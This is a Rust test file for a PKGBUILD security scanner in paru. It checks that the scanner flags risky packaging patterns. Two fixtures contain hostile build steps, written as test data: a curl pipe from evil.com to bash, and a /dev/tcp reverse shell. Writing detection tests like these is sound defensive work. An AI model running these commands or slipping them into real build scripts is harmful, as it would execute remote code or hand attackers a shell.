//! Tests for traur security integration

use std::path::PathBuf;
use std::fs;
use tempfile::TempDir;

/// Helper to create a test PKGBUILD
fn create_test_pkgbuild(dir: &TempDir, content: &str) -> PathBuf {
    let pkgbuild_path = dir.path().join("PKGBUILD");
    fs::write(&pkgbuild_path, content).unwrap();
    pkgbuild_path
}

/// Helper to get package directory path
fn get_pkg_dir(dir: &TempDir) -> PathBuf {
    dir.path().to_path_buf()
}

#[test]
fn test_clean_pkgbuild() {
    let temp_dir = TempDir::new().unwrap();
    let _pkgbuild = create_test_pkgbuild(&temp_dir, r#"
# Clean PKGBUILD without security issues
pkgname=test-package
pkgver=1.0.0
pkgrel=1
arch=('x86_64')
url="https://example.com"
license=('MIT')
source=("$pkgname-$pkgver.tar.gz::https://github.com/example/test/archive/v$pkgver.tar.gz")
sha256sums=('SKIP')

build() {
    cd "$srcdir/test-$pkgver"
    make
}

package() {
    cd "$srcdir/test-$pkgver"
    make install DESTDIR="$pkgdir"
}
"#);

    let config = paru::Config::new().unwrap();
    let result = paru::scan_pkgbuild_dir(
        &config,
        "test-package",
        &get_pkg_dir(&temp_dir)
    ).unwrap();

    // Clean package should have Trusted or Ok tier
    assert!(result.tier == "Trusted" || result.tier == "Ok", 
            "Expected clean package to be Trusted/Ok, got {:?}", result.tier);
    assert!(result.is_safe, "Clean package should be marked as safe");
}

#[test]
fn test_curl_pipe_shell() {
    let temp_dir = TempDir::new().unwrap();
    let _pkgbuild = create_test_pkgbuild(&temp_dir, r#"
# Malicious PKGBUILD with curl pipe to shell
pkgname=malicious-package
pkgver=1.0.0
pkgrel=1
arch=('x86_64')
url="https://example.com"
license=('MIT')
source=("$pkgname-$pkgver.tar.gz")
sha256sums=('SKIP')

build() {
    curl https://evil.com/script.sh | bash
}

package() {
    :
}
"#);

    let config = paru::Config::new().unwrap();
    let result = paru::scan_pkgbuild_dir(
        &config,
        "malicious-package",
        &get_pkg_dir(&temp_dir)
    ).unwrap();

    // Should detect curl pipe to shell
    assert!(!result.signals.is_empty(), "Should detect security signals");
    assert!(result.signals.iter().any(|s| s.id.contains("CURL") || s.id.contains("PIPE")),
            "Should detect curl pipe pattern");
}

#[test]
fn test_reverse_shell() {
    let temp_dir = TempDir::new().unwrap();
    let _pkgbuild = create_test_pkgbuild(&temp_dir, r#"
# Malicious PKGBUILD with reverse shell
pkgname=reverse-shell-package
pkgver=1.0.0
pkgrel=1
arch=('x86_64')
url="https://example.com"
license=('MIT')
source=("$pkgname-$pkgver.tar.gz")
sha256sums=('SKIP')

build() {
    bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
}

package() {
    :
}
"#);

    let config = paru::Config::new().unwrap();
    let result = paru::scan_pkgbuild_dir(
        &config,
        "reverse-shell-package",
        &get_pkg_dir(&temp_dir)
    ).unwrap();

    // Should detect reverse shell
    assert!(!result.signals.is_empty(), "Should detect security signals");
    assert!(result.signals.iter().any(|s| s.id.contains("REVSHELL") || s.id.contains("DEVTCP")),
            "Should detect reverse shell pattern");
}

#[test]
fn test_missing_checksums() {
    let temp_dir = TempDir::new().unwrap();
    let _pkgbuild = create_test_pkgbuild(&temp_dir, r#"
# PKGBUILD without checksums
pkgname=no-checksum-package
pkgver=1.0.0
pkgrel=1
arch=('x86_64')
url="https://example.com"
license=('MIT')
source=("$pkgname-$pkgver.tar.gz::https://github.com/example/test/archive/v$pkgver.tar.gz")

build() {
    :
}

package() {
    :
}
"#);

    let config = paru::Config::new().unwrap();
    let result = paru::scan_pkgbuild_dir(
        &config,
        "no-checksum-package",
        &get_pkg_dir(&temp_dir)
    ).unwrap();

    // Should detect missing checksums
    assert!(result.signals.iter().any(|s| s.id.contains("CHECKSUM")),
            "Should detect missing checksums");
}

#[test]
fn test_http_source() {
    let temp_dir = TempDir::new().unwrap();
    let _pkgbuild = create_test_pkgbuild(&temp_dir, r#"
# PKGBUILD with HTTP source
pkgname=http-source-package
pkgver=1.0.0
pkgrel=1
arch=('x86_64')
url="https://example.com"
license=('MIT')
source=("$pkgname-$pkgver.tar.gz::http://example.com/insecure.tar.gz")
sha256sums=('SKIP')

build() {
    :
}

package() {
    :
}
"#);

    let config = paru::Config::new().unwrap();
    let result = paru::scan_pkgbuild_dir(
        &config,
        "http-source-package",
        &get_pkg_dir(&temp_dir)
    ).unwrap();

    // Should detect HTTP source
    assert!(result.signals.iter().any(|s| s.id.contains("HTTP")),
            "Should detect HTTP source");
}

#[test]
fn test_suid_chmod_numeric() {
    let temp_dir = TempDir::new().unwrap();
    let _pkgbuild = create_test_pkgbuild(&temp_dir, r#"
pkgname=suid-package
pkgver=1.0.0
pkgrel=1
arch=('x86_64')
source=("https://example.com/src.tar.gz")
sha256sums=('SKIP')

package() {
    install -dm755 "${pkgdir}/opt/${pkgname}"
    chmod 4711 "${pkgdir}/opt/${pkgname}/chrome-sandbox"
}
"#);

    let config = paru::Config::new().unwrap();
    let result = paru::scan_pkgbuild_dir(
        &config,
        "suid-package",
        &get_pkg_dir(&temp_dir)
    ).unwrap();

    assert!(
        result.signals.iter().any(|s| s.id.contains("SUID")),
        "Should detect numeric suid chmod (e.g. 4711)"
    );
}

#[test]
fn test_no_pkgbuild_file() {
    let temp_dir = TempDir::new().unwrap();
    // Don't create PKGBUILD

    let config = paru::Config::new().unwrap();
    let result = paru::scan_pkgbuild_dir(
        &config,
        "missing-package",
        &get_pkg_dir(&temp_dir)
    ).unwrap();

    // Should report missing PKGBUILD
    assert_eq!(result.tier, "UNKNOWN");
    assert!(!result.is_safe);
    assert!(result.signals.iter().any(|s| s.id == "P-NO-PKGBUILD"),
            "Should report missing PKGBUILD");
}
